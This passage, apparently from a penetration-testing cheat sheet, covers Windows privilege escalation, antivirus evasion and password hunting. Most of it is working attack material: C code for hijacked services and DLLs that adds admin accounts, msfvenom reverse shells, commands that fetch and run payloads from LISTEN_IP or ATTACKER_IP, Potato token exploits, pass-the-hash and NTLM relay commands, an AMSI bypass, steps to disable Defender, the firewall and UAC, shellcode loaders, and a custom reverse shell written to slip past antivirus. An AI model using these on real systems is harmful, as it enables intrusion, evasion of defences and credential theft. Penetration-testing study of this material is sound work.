    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("Derp", (LPHANDLER_FUNCTION)ControlHandler);
    Run();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus (hStatus,  &ServiceStatus);
    return;
}
```

Compile with `x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe`, then
upload winsvc.exe to `%temp%`.

Alternatively, create a Service EXE with msfvenom.

```sh
msfvenom -p windows/shell_reverse_tcp -f exe-service --service-name "Derp" -o winsvc.exe lport=443 lhost=tun0
```

Then install and invoke the service:

```powershell
# overwrite regsvc execution path
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d %temp%\winsvc.exe /f
# restart regsvc
sc start regsvc
```


### 4.2.3 Windows Binary Hijacking

⚠**NOTE**: Listing services requires interactive logon via RDP. You will get a "not authorized" error through WinRM or bind/reverse shell!!

This privesc vector works by overwriting the executable file for Windows Services, Scheduled Tasks, and AutoRuns. Service hijacking, Scheduled Tasks hijacking, and AutoRuns hijacking.

You can automate the search for the privesc vector with PowerUp:

```sh
# on kali, serve up PowerUp.ps1
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
sudo python -m http.server 80

# on victim
certutil -urlcache -split -f http://LISTEN_IP/PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableService # can change binpath
Get-ModifiableServiceFile # can overwrite executable file
Get-ModifiableRegistryAutoRun # can modify executable file/path
Get-ModifiableScheduledTaskFile # can modify task executable
```

To find the vulnerability manually:

First look for running services with paths outside `C:\Windows\System32`:

```powershell
# Get-CimInstance supercedes Get-WmiObject
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
# alternatively
wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
```

Here's how to look for Scheduled Tasks:

```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

Next, check permissions of binary files:

```powershell
icacls "C:\path\to\binary.exe"
```

Common `icacls` permissions masks:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

Look for ones that allow writing (F, M, W), especially under `Authenticated Users`.

**Exploiting the vulnerability**:

If the service binary is invoked without arguments, you can easily use `PowerUp.ps1` to exploit it:

```powershell
# create new local admin user derp:herpderp
powershell -ep bypass
. .\PowerUp.ps1
Install-ServiceBinary -User 'derp' -Password 'herpderp' -ServiceName 'SERVICENAME'
# by default, creates new local user: john with password Password123!
```

To exploit manually:

Create a malicious service binary. Here is a simple one that adds a new admin user account:

```c
// compile with:
// x86_64-w64-mingw32-gcc derp.c -o derp.exe

#include <stdlib.h>

int main ()
{
  system ("net user derp herpderp /add");
  system ("net localgroup administrators derp /add");
  return 0;
}
```

Alternatively, create the windows service binary with `msfvenom`.

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!

# run arbitrary command - msfvenom
msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=tun0
```

Once compiled, transfer over to victim machine and replace the vulnerable service binary with your own.

```powershell
iwr -uri http://192.168.119.3/derp.exe -Outfile derp.exe
move C:\path\to\vulnerable\service.exe service.exe.bak
move .\derp.exe C:\path\to\vulnerable\service.exe
```

Try to restart the service:

```powershell
net stop SERVICENAME
net start SERVICENAME
```

If you get "Access Denied" error, you may be able to restart service by rebooting machine:

```powershell
# check the StartMode
# if it's "Auto", you can restart the service by rebooting
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}

# check that you can reboot
# look for "SeShutdownPrivilege" being present (doesn't matter if it says "Disabled")
whoami /priv

# restart the machine
shutdown /r /t 0
```


### 4.2.4 Windows DLL Hijacking

References:
- [HackTricks DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

There are multiple ways to hijack a DLL. One method is to overwrite an existing DLL that you have write permissions for, but this can often cause the program to crash because it's looking for exports that the malicious DLL doesn't provide.

A better way is to abuse the DLL search order (sometimes called *Search Order Hijacking*). Here is the default search order in Windows with **SafeDllSearchMode** enabled (when it's disabled, the current working directory jumps up to slot #2):

1. The directory from which the application loaded.
2. The system directory. (`C:\Windows\System32`)
3. The 16-bit system directory. (`C:\Windows\System`)
4. The Windows directory.  (`C:\Windows`)
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Note: if you can edit the SYSTEM PATH variable, you can potentially use that to perform a DLL search order hijack. You can check if you have Write permissions on any directories in the PATH with (WinPEAS does this automatically):

```
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

You can check if SafeDLLSearchMode is enabled in the registry:

```powershell
# Enabled = 1, Disabled = 0
reg query 'HKLM\System\CurrentControlSet\Control\Session Manager' /v SafeDllSearchMode
# or
Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Session Manager' -Name SafeDllSearchMode
```


**Finding Missing DLLs**:

Automated way with PowerUp.ps1:

```powershell
iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Find-ProcessDLLHijack
Find-PathDLLHijack
```

To manually see if a binary is missing DLLs, you can use Process Monitor (procmon, from [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip)). This requires admin privileges, so you may need to copy over the service binary and DLLs to your own Windows machine to test. It's also possible to perform static binary reverse engineering, but that's a pain.

```sh
wget https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals SysinternalsSuite.zip
impacket-smbserver -smb2support -user derp -password herpderp share .
# connect with: net use \\ATTACKER_IP herpderp /user:derp
```

Add Filters to procmon to only see missing DLL events. This happens when `CreateFile()` results in a `NAME NOT FOUND` error while trying to open a DLL. 

| Column       | Relation  | Value           | Action  |
| ------------ | --------- | --------------- | ------- |
| Path         | ends with | .dll            | Include |
| Result       | contains  | not found       | Include |
| Operation    | is        | CreateFile      | Include |
| Process Name | is        | `TARGETSVC.exe` | Include |

Restart the service/process and check procmon to see if it fails to load any DLLs:

```powershell
Restart-Service VICTIMSERVICE
```

If you find DLLs that fail to open, and the search order includes a path that you can write to, you're in luck.

**Exploiting:**

Create a malicious DLL. Here is a simple example that adds a local admin user:

```c
// compile with:
// x86_64-w64-mingw32-gcc derp.c -shared -o derp.dll

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
  switch ( ul_reason_for_call )
  {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
      system ("net user derp herpderp /add");
      system ("net localgroup administrators derp /add");
      break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
      break;
    case DLL_THREAD_DETACH: // A thread exits normally.
      break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
      break;
  }
  return TRUE;
}
```

Alternatively, you can use `msfvenom` to create a malicious DLL:

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1!
```

> ⚠ **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!

Put the new DLL in the search path of the service executable on the victim host, then restart the service.

```powershell
# copy the dll to the correct location with the correct name
iwr -uri http://LISTEN_IP/derp.dll -Outfile C:\path\to\REALNAME.dll
# or
certutil -urlcache -split -f http://LISTEN_IP/derp.dll C:\path\to\REALNAME.dll

# restart service
Restart-Service VICTIMSERVICE
```


### 4.2.5 Unquoted Windows Service Paths

If a Windows service's path contains spaces and isn't quoted in the service entry, you might be able to hijack its execution by inserting a binary that gets executed in its place. This requires write permissions to the **parent directory** of whichever path component contains a space, and you drop and EXE in that directory named `word-before-space.exe`. For example, if the path starts with `C:\Program Files\...`, then you'd need write permissions to `C:\`, and would drop an EXE named `Program.exe`.

This is how Windows tries to resolve the unquoted path `C:\Program Files\My Program\My service\service.exe`:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

**Finding Unquoted Service Paths**:

```powershell
# lists all unquoted service paths with a space in them
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notlike '"*' -and $_.PathName -like '* *.exe*'} | select Name,PathName
# alternatively, for cmd only
wmic service where "pathname like '% %.exe%'" get name,pathname |  findstr /ipv "C:\\Windows\\" | findstr /ipv """


# alternatively, use PowerUp.ps1
iwr http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

For paths you find, check permissions of each appropriate directory with `icacls DIRECTORY`. Look for write permissions (F, M, W), especially for `Authenticated Users`.

**Exploiting:**

Once you find your candidate, generate a payload binary with `msfvenom` or whatever:

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!

# host on http
sudo python -m http.server 80
```

Then drop it in the appropriate directory with the appropriate name on the victim:

```powershell
# grab file and put it in right spot with right name
iwr http://VICTIM_IP/derp.exe -outfile C:\path\to\file.exe

# restart the service
restart-service "SERVICENAME"
```

If you are using PowerUp, you can use that to exploit the vulnerability:

```powershell
powershell -e bypass
. .\PowerUp.ps1
# change path as appropriate
Write-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpderp' -Path "C:\Program Files\Enterprise Apps\Current.exe"

# still restart service
restart-service "SERVICENAME"
```


### 4.2.6 Windows Token Impersonation

You can use token impersonation to elevate privileges.

These require the `SeImpersonatePrivilege` or `SeAssignprimaryTokenPrivilege` to be enabled. This is the case when you have a shell running as `NT AUTHORITY\LOCAL SERVICE`, as well as `Local System`, `Network Service`, and `Application Pool Identity` (common when access was from exploiting IIS or other Windows services).

#### 4.2.6.1 Windows Token Impersonation with GodPotato

GodPotato works with a wide range of Windows versions (Windows Server 2012 - Windows Server 2022; Windows 8 - Windows 11). It's also very easy to use as a way to run a command as SYSTEM as long as your current user has the `SeImpersonatePrivilege`.

```sh
# On windows host, first check .NET version
dir C:\windows\microsoft.net\framework\

# On Kali, download appropriate binary
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe

# also generate a reverse shell
msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0

# start a HTTP server to host the binaries
python -m http.server 80

# start reverse shell listener
nc -lvnp 443

# On windows, download and execute GodPotato with reverse shell
cd C:\Users\Public
iwr -uri http://LISTEN_IP/derp.exe -Outfile derp.exe
iwr -uri http://LISTEN_IP/GodPotato-NET4.exe -Outfile GodPotato.exe
.\GodPotato.exe -cmd "C:\users\public\derp.exe"
```



#### 4.2.6.2 Windows Token Impersonation with PrintSpoofer

First grab the binary and host it on HTTP.

```sh
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
sudo python3 -m http.server 80
```

Then throw the exploit on the Windows victim.

```powershell
iwr -uri http://LISTEN_IP/PrintSpoofer64.exe -Outfile PrintSpoofer.exe

# throw the exploit
.\PrintSpoofer.exe -i -c "powershell"
```

#### 4.2.6.3 Windows Token Impersonation with RoguePotato

NOTE: Alternatives to RoguePotato include: _RottenPotato_, _SweetPotato_, _JuicyPotato_, and [_JuicyPotatoNG_](https://github.com/antonioCoco/JuicyPotatoNG).

```sh
# on kali box, grab binary
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip

# set up socat redirector for roguepotato to bounce off of
sudo socat -dd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
# also start another netcat listener to catch the system shell
sudo nc -vlnp 443
```

On windows victim:

```powershell
# in windows reverse shell with "SeImpersonatePrivilege"
# or "SeAssignPrimaryTokenPrivilege" enabled

# grab the binary
iwr -uri http://LISTEN_IP/RoguePotato.exe -Outfile RoguePotato.exe

# run the exploit
./RoguePotato.exe -l 9999 -e "C:\Users\Public\revshell.exe" -r LISTEN_IP
# and bingo! you should have system on the listener you set up!
```

### 4.2.7 Windows Pass-The-Hash Attacks

There are lots of ways to pass the hash on windows, giving you access as a user
with just the hash of their creds.

See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.

Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.

```sh
# Get remote powershell shell by passing the hash
# install: sudo apt install evil-winrm
evil-winrm -i $VICTIM_IP -u username -H NTHASH

# Run remote command as SYSTEM (note colon before NT hash)
impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
# omit the command to get interactive shell

# Run remote command as Administrator; same syntax as psexec
impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP

# execute remote command as Admin (IP MUST GO LAST!)
crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP

# spawn cmd.exe shell on remote windows box
# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe

# other options for PtH: xfreerdp, smbclient
```


### 4.2.8 Windows NTLMv2 Hash Relay Attack

When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.

```sh
# '-c' flag is command to run
# here we are generating a powershell reverse shell one-liner
# as base64-encoded command
sudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"

# start a netcat listener to catch the reverse shell
sudo nc -nvlp 443
```


## 4.3 Antivirus & Firewall Evasion

Advanced Evasion techniques:

- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf

### 4.3.1 Cross-Compiling Windows Binaries on Linux

You can use `mingw` to cross-compile C files.

```sh
# make sure you link Winsock with `-lws2_32` when using winsock.h
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

# you can test that windows EXE's run as expected by using 'wine':
wine syncbreeze_exploit.exe
```

[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE for C# and .NET.



### 4.3.2 Shellter

You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.

To check that your exploit works:

```sh
# start listener for reverse shell
sudo nc -lvnp 443

# run shellter-injected binary with wine
wine derp.exe
```

**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.



### 4.3.3 Windows Process Injection

The general technique for injecting shellcode into another (running) process goes like this:

1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
2. ***VirtualAllocEx*** - Allocate memory within the target process
3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process

These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).

Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:

```powershell
$imports = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;

# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0
[Byte[]];
[Byte[]]$s = <SHELLCODE HERE>;

$size = 0x1000;

if ($s.Length -gt 0x1000) {$size = $s.Length};

$x = $w::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};

$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```



### 4.3.4 Windows AMSI Bypass

This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
will e.g. block malicious powershell scripts from running. If you get a warning
saying something like "This script contains malicious content and has been blocked
by your antivirus software", then run this command to disable that blocker.

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).



### 4.3.5 Turn off Windows Firewall

```powershell
# must be done from administrator prompt
# Disable Windows firewall on newer Windows:
netsh advfirewall set allprofiles state off

# Disable Windows firewall on older Windows:
netsh firewall set opmode disable
```



### 4.3.6 Turn off Windows Defender

```powershell
# must be running powershell as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true

# for completely removing Windows Defender (until next Windows update)
Uninstall-WindowsFeature -Name Windows-Defender
```

Alternatively, you should be able to do it with services:

```powershell
sc config WinDefend start= disabled
sc stop WinDefend

# to restart Defender
sc config WinDefend start= auto
sc start WinDefend
```

I think you can even disable it with Registry keys:

```powershell
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t DWORD /d 1 /f

# more granular controls
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableScanOnRealtimeEnable /t DWORD /d 1 /f

# then reboot for changes to take effect
```



### 4.3.7 Windows Encoding/Decoding with LOLBAS

```powershell
# base64 encode a file
certutil -encode inputFileName encodedOutputFileName
# base64 decode a file
certutil -decode encodedInputFileName decodedOutputFileName
# hex decode a file
certutil --decodehex encoded_hexadecimal_InputFileName
# MD5 checksum
certutil -hashfile somefile.txt MD5
```



### 4.3.8 Execute Inline Tasks with MSBuild.exe

MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
C#/.NET code inline. Modify the XML file below with your shellcode from
msfvenom's "-f csharp" format (or build a payload with Empire's
windows/launcher_xml stager, or write your own C# and host over SMB)

To build:
```powershell
# locate MSBuild executables
dir /b /s C:\msbuild.exe

# execute 32-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml

# execute 64-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
```

Here's the payload.xml template to inject your shellcode into (if not building
with Empire)

```xml
<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
     shellcode, and build with 64-bit MSBuild.exe
     Building Shellcode:
     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <!-- to host code remotely, instead use:
      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
      -->
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
          private static UInt32 MEM_COMMIT = 0x1000;
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
          public override bool Execute()
          {
            //PUT YOUR SHELLCODE HERE;

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```



### 4.3.9 Custom Windows TCP Reverse Shell

A custom reverse shell can often get past antivirus.

```c
/* Win32 TCP reverse cmd.exe shell
 * References:
 * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
 */
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// CHANGE THESE
#define TARGET_IP   "LISTEN_IP"
#define TARGET_PORT 443

void main(void) {
  SOCKET s;
  WSADATA wsa;
  STARTUPINFO si;
  struct sockaddr_in sa;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2,2), &wsa);
  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
  sa.sin_port = htons(TARGET_PORT);
  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
  SecureZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError = (HANDLE)s;
  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
```

To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):

```sh
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install mingw-w64 wine
i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
```



### 4.3.10 Windows UAC Bypass

Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.

UAC Enabled registry key (can only modify as admin):

``` powershell
# Disabling UAC via registry:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0

# Enabling UAC:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
```

Bypass Technique:

```powershell
# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

# To undo:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```



## 4.4 Windows Passwords & Hashes

Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.

> **NOTE**: The empty/blank LM hash value is always `aad3b435b51404eeaad3b435b51404ee`.
> The empty/blank NT hash value is always `31d6cfe0d16ae931b73c59d7e0c089c0`.

Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)


### 4.4.1 Windows Passwords in Files

Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
an AES-encrypted password, but the static key is published on the MSDN website.

To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`

```powershell
# Unattend files
%SYSTEMDRIVE%\unattend.txt
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

# Group Policy Object files
# decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)
%WINDIR%\SYSVOL\Groups.xml
%WINDIR%\SYSVOL\scheduledtasks.xml
%WINDIR%\SYSVOL\Services.xml

# sysprep
%SYSTEMDRIVE%\sysprep.inf
%SYSTEMDRIVE%\sysprep\sysprep.xml

# FileZilla config:
# look for admin creds in FileZilla Server.xml
dir /s/b C:\FileZilla*.xml
type "FileZilla Server.xml" | findstr /spin /c:admin
type "FileZilla Server Interface.xml" | findstr /spin /c:admin

# less likely, still worth looking
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```


**Finding Passwords in Windows Files**:

```powershell
# search specific filetypes for "password"
findstr /spin password *.txt *.xml *.ini *.config

# Searching all files (lots of output)
findstr /spin "password" *.*

# find files that might have credentials in them
cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
dir /b /s *passw* *creds* *credential*
dir /b /s *.config *.conf *.cfg
```


### 4.4.2 Windows Passwords in Registry

```powershell
# Windows autologin credentials (32-bit and 64-bit versions)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

# VNC
